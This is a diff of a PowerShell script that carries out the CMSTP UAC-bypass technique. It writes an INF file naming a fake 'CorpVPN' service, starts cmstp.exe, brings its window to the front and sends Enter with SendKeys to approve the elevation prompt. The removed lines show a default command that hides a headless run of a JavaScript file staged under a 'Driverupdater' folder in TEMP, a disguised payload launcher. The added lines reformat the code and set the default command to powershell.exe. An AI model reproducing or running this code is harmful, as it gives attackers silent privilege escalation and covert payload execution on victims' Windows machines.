@@ -1,14 +1,14 @@
 Function script:Set-INFFile {
-    [CmdletBinding()]
-    Param (
-        [Parameter(HelpMessage="Specify the INF file location")]
-        $InfFileLocation = "$env:temp\CMSTP.inf",
-        
-        [Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
-        [String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command Start-Process -FilePath "conhost.exe" -ArgumentList "--headless cmd /c `"$env:TEMP\Driverupdater\driver.js`"" -WindowStyle Hidden'
-    )
+[CmdletBinding()]
+	Param (
+	[Parameter(HelpMessage="Specify the INF file location")]
+	$InfFileLocation = "$env:temp\CMSTP.inf",
+	
+	[Parameter(HelpMessage="Specify the command to launch in a UAC-privileged window")]
+	[String]$CommandToExecute = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
+	)
 
-    $InfContent = @"
+$InfContent = @"
 [version]
 Signature=`$chicago`$
 AdvancedINF=2.5
@@ -31,85 +31,102 @@ taskkill /IM cmstp.exe /F
 [Strings]
 ServiceName="CorpVPN"
 ShortSvcName="CorpVPN"
+
 "@
 
-    $InfContent | Out-File $InfFileLocation -Encoding ASCII
+$InfContent | Out-File $InfFileLocation -Encoding ASCII
 }
 
-Function Get-Hwnd {
-    [CmdletBinding()]
-    Param (
-        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
-    )
-    Process {
+
+Function Get-Hwnd
+{
+  [CmdletBinding()]
+    
+  Param
+  (
+    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $ProcessName
+  )
+  Process
+    {
         $ErrorActionPreference = 'Stop'
-        Try {
+        Try 
+        {
             $hwnd = Get-Process -Name $ProcessName | Select-Object -ExpandProperty MainWindowHandle
         }
-        Catch {
+        Catch 
+        {
             $hwnd = $null
         }
         $hash = @{
-            ProcessName = $ProcessName
-            Hwnd        = $hwnd
+        ProcessName = $ProcessName
+        Hwnd        = $hwnd
         }
-        New-Object -TypeName PsObject -Property $hash
+        
+    New-Object -TypeName PsObject -Property $hash
     }
 }
 
-function Set-WindowActive {
-    [CmdletBinding()]
-    Param (
-        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
-    )
-    Process {
-        $memberDefinition = @'
-        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+function Set-WindowActive
+{
+  [CmdletBinding()]
+
+  Param
+  (
+    [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)] [string] $Name
+  )
+  
+  Process
+  {
+    $memberDefinition = @'
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+
 '@
 
-        Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
-        $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
-        If ($hwnd) {
-            $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
-            [User32.Api]::SetForegroundWindow($hwnd)
-            [User32.Api]::ShowWindow($hwnd, 5)
-        }
-        Else {
-            [string] $hwnd = 'N/A'
-        }
-
-        $hash = @{
-            Process = $Name
-            Hwnd    = $hwnd
-        }
-        New-Object -TypeName PsObject -Property $hash
+    Add-Type -MemberDefinition $memberDefinition -Name Api -Namespace User32
+    $hwnd = Get-Hwnd -ProcessName $Name | Select-Object -ExpandProperty Hwnd
+    If ($hwnd) 
+    {
+      $onTop = New-Object -TypeName System.IntPtr -ArgumentList (0)
+      [User32.Api]::SetForegroundWindow($hwnd)
+      [User32.Api]::ShowWindow($hwnd, 5)
     }
+    Else 
+    {
+      [string] $hwnd = 'N/A'
+    }
+
+    $hash = @{
+      Process = $Name
+      Hwnd    = $hwnd
+    }
+        
+    New-Object -TypeName PsObject -Property $hash
+  }
 }
 
-# Create the INF file with the command to execute
 . Set-INFFile
-
-# Add Windows Forms for SendKeys
-Add-Type -AssemblyName System.Windows.Forms
-
+#Needs Windows forms
+add-type -AssemblyName System.Windows.Forms
 If (Test-Path $InfFileLocation) {
-    # Command to run cmstp.exe with the INF file
-    $ps = New-Object System.Diagnostics.ProcessStartInfo "c:\windows\system32\cmstp.exe"
-    $ps.Arguments = "/au $InfFileLocation"
-    $ps.UseShellExecute = $false
+#Command to run
+$ps = new-object system.diagnostics.processstartinfo "c:\windows\system32\cmstp.exe"
+$ps.Arguments = "/au $InfFileLocation"
+$ps.UseShellExecute = $false
 
-    # Start cmstp.exe
-    [System.Diagnostics.Process]::Start($ps)
+#Start it
+[system.diagnostics.process]::Start($ps)
 
-    # Wait until cmstp.exe is an active window
-    do {
-        # Do nothing until cmstp is an active window
-    } until ((Set-WindowActive cmstp).Hwnd -ne 0)
+do
+{
+	# Do nothing until cmstp is an active window
+}
+until ((Set-WindowActive cmstp).Hwnd -ne 0)
 
-    # Activate the cmstp window
-    Set-WindowActive cmstp
 
-    # Send the Enter key to confirm the UAC prompt
-    [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+#Activate window
+Set-WindowActive cmstp
+
+#Send the Enter key
+[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
 }
